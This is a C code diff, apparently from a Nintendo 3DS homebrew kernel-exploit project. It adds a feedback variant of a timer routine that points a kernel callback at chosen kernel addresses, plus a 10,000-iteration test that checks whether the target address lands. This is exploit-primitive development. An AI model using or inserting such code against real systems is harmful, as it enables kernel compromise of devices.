@@ -23,7 +23,7 @@ static u64 get_tick_offset() {
   return offset;
 }
 
-static bool set_timer_internal(Handle timer, u32 kernel_callback_int, u32 carry) {
+static bool set_timer_internal(Handle timer, u32 kernel_callback_int, u32 carry, u64 *offset_res) {
   if (!(kernel_callback_int & 0x80000000)) {
     printf("set_timer_internal called with non-negative arg\n");
     return false;
@@ -77,12 +77,33 @@ static bool set_timer_internal(Handle timer, u32 kernel_callback_int, u32 carry)
     return false;
   }
 
+  *offset_res = offset;
   return true;
 }
 
 bool set_timer(Handle timer, u32 kernel_callback_int) {
   if ((kernel_callback_int & 0x80000000) == 0) {
-    printf("set_timer only support kernel (negative) addresses\n");
+    printf("set_timer only supports kernel (negative) addresses\n");
+    return false;
+  }
+
+  u64 timeout = 0x100000000 | kernel_callback_int;
+  u32 carry = timeout % 3;
+  timeout /= 3;
+  u64 offset_res = 0;
+
+  if (!set_timer_internal(timer, (u32)timeout, carry, &offset_res)) {
+    printf("set_timer_internal failed\n");
+    return false;
+  }
+
+  return true;
+}
+
+bool set_timer_feedback(Handle timer, u32 kernel_callback_int, u64 *feedback) {
+  if ((kernel_callback_int & 0x80000000) == 0) {
+    printf("set_timer only supports kernel (negative) addresses\n");
+    printf("got: 0x%lx\n", kernel_callback_int);
     return false;
   }
 
@@ -90,7 +111,7 @@ bool set_timer(Handle timer, u32 kernel_callback_int) {
   u32 carry = timeout % 3;
   timeout /= 3;
 
-  if (!set_timer_internal(timer, (u32)timeout, carry)) {
+  if (!set_timer_internal(timer, (u32)timeout, carry, feedback)) {
     printf("set_timer_internal failed\n");
     return false;
   }
@@ -161,5 +182,44 @@ bool initialize_timer_state() {
     printf("failed to close timer handle\n");
     return false;
   }
+  return true;
+}
+
+bool set_timer_test() {
+  if (!initialize_handle_address()) {
+    printf("[-] Unsupported kernel version.\n");
+    return false;
+  }
+  printf("[+] Initialized kernel-specific offsets.\n");
+
+  Handle timer;
+  Result res = svcCreateTimer(&timer, 2);
+  if (res < 0) {
+    printf("failed to create timer\n");
+    return false;
+  }
+
+  u32 target = (u32)RandomStub;
+  for (int i = 0; i < 10000; i++) {
+    u64 feedback = 0;
+    if (!set_timer_feedback(timer, target, &feedback)) {
+      printf("set_timer_feedback failed\n");
+      svcCloseHandle(timer);
+      return false;
+    }
+    u64 initial = 0;
+    if (!get_timer_value(timer, &initial, NULL)) {
+      printf("get_timer_value failed\n");
+      svcCloseHandle(timer);
+      return false;
+    }
+    u32 real_target = (u32)((initial) >> 32);
+    printf("attempt[%d]: (0x%llx, 0x%lx, 0x%llx)\n", i+1, feedback, target, initial);
+    if (target != real_target) {
+      wait_for_user();
+    }
+  }
+
+  svcCloseHandle(timer);
   return true;
 }
